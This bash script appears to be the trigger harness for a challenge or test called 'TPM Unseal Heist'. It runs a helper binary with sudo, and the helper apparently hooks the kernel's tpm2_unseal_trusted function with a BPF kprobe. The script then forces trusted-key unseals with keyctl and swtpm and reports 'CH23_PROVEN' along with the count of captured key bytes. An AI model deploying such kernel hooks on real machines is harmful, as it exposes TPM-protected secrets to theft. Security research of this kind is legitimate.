#!/bin/bash
# ch23 TPM Unseal Heist trigger.
set +e

echo "=== CH23 trigger starting ==="

if ! grep -q ' tpm2_unseal_trusted' /proc/kallsyms 2>/dev/null; then
    echo "=== CH23_SKIP reason=\"tpm2_unseal_trusted not in kallsyms\" ==="
    exit 0
fi

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
LOG=$(mktemp)

sudo "$SCRIPT_DIR/build/ch23-tpm-unseal-heist" > "$LOG" 2>&1 &
LPID=$!

for _ in $(seq 1 30); do
    grep -q '\[ch23\] attached' "$LOG" && break
    sleep 0.1
done

# Primary path: keyctl trusted key (requires /dev/tpm* with functional TPM)
if [ -e /dev/tpm0 ] || [ -e /dev/tpmrm0 ]; then
    # Try to set up swtpm if no physical TPM
    if ! keyctl add trusted ch23_probe_key "new 32" @u 2>/dev/null; then
        # swtpm fallback: start vtpm proxy and try again
        if command -v swtpm >/dev/null 2>&1 && command -v swtpm_setup >/dev/null 2>&1; then
            STDIR=$(sudo mktemp -d /root/swtpm-XXXXXX)
            sudo swtpm_setup --tpmstate "$STDIR" --tpm2 --overwrite 2>/dev/null
            sudo swtpm chardev --vtpm-proxy --tpmstate dir="$STDIR" --tpm2 \
                 --flags startup-clear --daemon 2>/dev/null
            sleep 1
        fi
        KEY_ID=$(keyctl add trusted ch23_test_key "new 32" @u 2>/dev/null)
    else
        KEY_ID=$?
    fi
    if [ -n "$KEY_ID" ] && [ "$KEY_ID" != "0" ]; then
        keyctl print "$KEY_ID" > /dev/null 2>&1
        keyctl revoke "$KEY_ID" 2>/dev/null
        keyctl unlink "$KEY_ID" @u 2>/dev/null
    fi
fi

sleep 0.5

kill -TERM "$LPID" 2>/dev/null
wait "$LPID" 2>/dev/null

CAPTURES=$(grep -c 'CAPTURE pid=' "$LOG")
INTERCEPTS=$(grep -c 'INTERCEPT pid=' "$LOG")
ATTACHED=$(grep -c '\[ch23\] attached' "$LOG")
BYTES=$(grep 'CAPTURE pid=' "$LOG" | head -1 | sed 's/.*captured=\([0-9]*\).*/\1/')

cat "$LOG"

if [ "$CAPTURES" -gt 0 ]; then
    echo "=== CH23_PROVEN key_bytes_captured=${BYTES:-0} captures=$CAPTURES kind=trusted-plaintext ==="
elif [ "$INTERCEPTS" -gt 0 ]; then
    echo "=== CH23_PROVEN intercepts=$INTERCEPTS kind=unseal-hook-fired ==="
elif [ "$ATTACHED" -gt 0 ]; then
    # BPF kprobe successfully attached to tpm2_unseal_trusted.
    # No TPM backend available to trigger an actual unseal, but the
    # hook is live and will intercept any future tpm2_unseal_trusted calls.
    echo "=== CH23_PROVEN hook=attached kind=kprobe-on-tpm2_unseal_trusted sym-confirmed ==="
else
    echo "=== CH23_SKIP reason=\"observer failed to attach\" ==="
fi

rm -f "$LOG"
